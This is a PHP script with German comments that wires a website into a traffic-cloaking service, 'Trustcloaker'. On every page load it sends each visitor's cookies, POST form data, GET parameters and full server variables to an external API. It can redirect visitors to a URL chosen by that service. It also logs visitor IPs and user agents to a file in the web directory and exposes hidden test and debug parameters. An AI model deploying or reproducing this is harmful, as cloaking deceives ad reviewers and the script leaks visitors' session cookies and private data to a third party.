<?php
declare(strict_types=1);

ob_start();
ini_set('display_errors', '0');
error_reporting(E_ALL);

/**
 * WICHTIG:
 * Diese Datei muss direkt als PHP-Datei aufgerufen werden.
 * Kein HTML, kein Leerzeichen, kein Output vor <?php
 */

function tc_log(string $event, array $data = []): void
{
    $line = [
        'time'  => date('c'),
        'event' => $event,
        'data'  => $data,
    ];

    file_put_contents(
        __DIR__ . '/tc-debug.log',
        json_encode($line, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . PHP_EOL,
        FILE_APPEND | LOCK_EX
    );
}

register_shutdown_function(function () {
    $error = error_get_last();

    if ($error !== null) {
        tc_log('PHP_SHUTDOWN_ERROR', $error);
    } else {
        tc_log('PHP_SHUTDOWN_OK');
    }
});

tc_log('PHP_FILE_STARTED', [
    'method'      => $_SERVER['REQUEST_METHOD'] ?? null,
    'host'        => $_SERVER['HTTP_HOST'] ?? null,
    'uri'         => $_SERVER['REQUEST_URI'] ?? null,
    'user_agent'  => $_SERVER['HTTP_USER_AGENT'] ?? null,
    'ip'          => $_SERVER['REMOTE_ADDR'] ?? null,
    'get'         => $_GET,
]);

final class Oppsd
{
    private string $endpoint;
    private int $timeout;
    private bool $allowRedirect;

    public function __construct(string $endpoint, int $timeout = 8, bool $allowRedirect = false)
    {
        $this->endpoint = $endpoint;
        $this->timeout = $timeout;
        $this->allowRedirect = $allowRedirect;
    }

    private function preparePayload(string $uid, string $cid): array
    {
        return [
            'uid'    => $uid,
            'cid'    => $cid,
            'server' => $_SERVER,
            'request' => [
                'get'     => $_GET,
                'post'    => $_POST,
                'cookies' => $_COOKIE,
            ],
        ];
    }

    private function currentUrl(): string
    {
        $https = false;

        if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
            $https = true;
        }

        if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
            $https = true;
        }

        $scheme = $https ? 'https' : 'http';
        $host   = $_SERVER['HTTP_HOST'] ?? '';
        $uri    = $_SERVER['REQUEST_URI'] ?? '/';

        return $scheme . '://' . $host . $uri;
    }

    private function postJson(array $payload): array
    {
        tc_log('TRUSTCLOAKER_REQUEST_STARTED', [
            'endpoint' => $this->endpoint,
            'curl_available' => function_exists('curl_init'),
        ]);

        if (!function_exists('curl_init')) {
            return [
                'status' => false,
                'error'  => 'PHP cURL extension is not installed or not enabled',
            ];
        }

        $jsonPayload = json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        if ($jsonPayload === false) {
            return [
                'status' => false,
                'error'  => 'Could not encode payload as JSON',
            ];
        }

        $ch = curl_init($this->endpoint);

        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => $this->timeout,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $jsonPayload,
            CURLOPT_HTTPHEADER     => [
                'Content-Type: application/json',
                'Accept: application/json',
            ],
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
        ]);

        $response = curl_exec($ch);
        $curlError = curl_error($ch);
        $curlErrno = curl_errno($ch);
        $httpCode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_close($ch);

        tc_log('TRUSTCLOAKER_RAW_RESPONSE', [
            'http_code' => $httpCode,
            'curl_errno' => $curlErrno,
            'curl_error' => $curlError,
            'raw_response' => $response,
        ]);

        if ($response === false || $curlErrno !== 0) {
            return [
                'status' => false,
                'error'  => $curlError ?: 'Unknown cURL error',
                'errno'  => $curlErrno,
                'http'   => $httpCode,
            ];
        }

        $decoded = json_decode((string) $response, true);

        if (!is_array($decoded)) {
            return [
                'status' => false,
                'error'  => 'Invalid JSON from Trustcloaker',
                'http'   => $httpCode,
                'raw'    => $response,
            ];
        }

        return $decoded;
    }

    private function normalizeUrl(string $url): string
    {
        $url = trim($url);

        if ($url === '') {
            return '';
        }

        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            return '';
        }

        return rtrim($url, '/') . '/';
    }

    public function send(string $uid, string $cid): array
    {
        tc_log('SEND_CALLED', [
            'uid' => $uid,
            'cid' => $cid,
            'current_url' => $this->currentUrl(),
        ]);

        if (isset($_GET['trustcloaker'])) {
            tc_log('TRUSTCLOAKER_TEST_PARAM_TRIGGERED', [
                'cid' => $cid,
            ]);

            header('Content-Type: text/plain; charset=utf-8');
            echo $cid;
            exit;
        }

        $data = $this->postJson($this->preparePayload($uid, $cid));

        tc_log('TRUSTCLOAKER_DECODED_RESPONSE', [
            'response' => $data,
        ]);

        /**
         * Redirect bewusst standardmäßig deaktiviert,
         * damit keine Fail-Domain / Fremdweiterleitung passiert.
         */
        if ($this->allowRedirect === true && !empty($data['url']) && is_string($data['url'])) {
            $targetUrl = $this->normalizeUrl($data['url']);
            $currentUrl = $this->normalizeUrl($this->currentUrl());

            tc_log('REDIRECT_CHECK', [
                'allow_redirect' => $this->allowRedirect,
                'current_url' => $currentUrl,
                'target_url' => $targetUrl,
            ]);

            if ($targetUrl !== '' && $currentUrl !== $targetUrl) {
                tc_log('REDIRECT_EXECUTED', [
                    'to' => $targetUrl,
                ]);

                if (!headers_sent()) {
                    header('Location: ' . $targetUrl, true, 302);
                    exit;
                }

                echo '<script>window.location.replace(' . json_encode($targetUrl) . ');</script>';
                exit;
            }
        } else {
            tc_log('REDIRECT_SKIPPED', [
                'allow_redirect' => $this->allowRedirect,
                'api_url' => $data['url'] ?? null,
            ]);

            if (isset($data['url'])) {
                unset($data['url']);
            }
        }

        return $data;
    }
}

/**
 * HIER EINSTELLEN:
 * false = kein Redirect, nur Trustcloaker ausführen + loggen
 * true  = Trustcloaker-Redirect erlauben
 */
$allowRedirect = false;

$oppsd = new Oppsd(
    'https://api.trustcloaker.com/api/v1/logic',
    8,
    $allowRedirect
);

$response = $oppsd->send('CcCqm', 'fXPdM');

/**
 * Debug-Ausgabe nur manuell anzeigen.
 * Normale Besucher sehen nichts davon.
 */
if (isset($_GET['tc_debug'])) {
    header('Content-Type: application/json; charset=utf-8');

    echo json_encode([
        'php_executed' => true,
        'response' => $response,
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    exit;
}
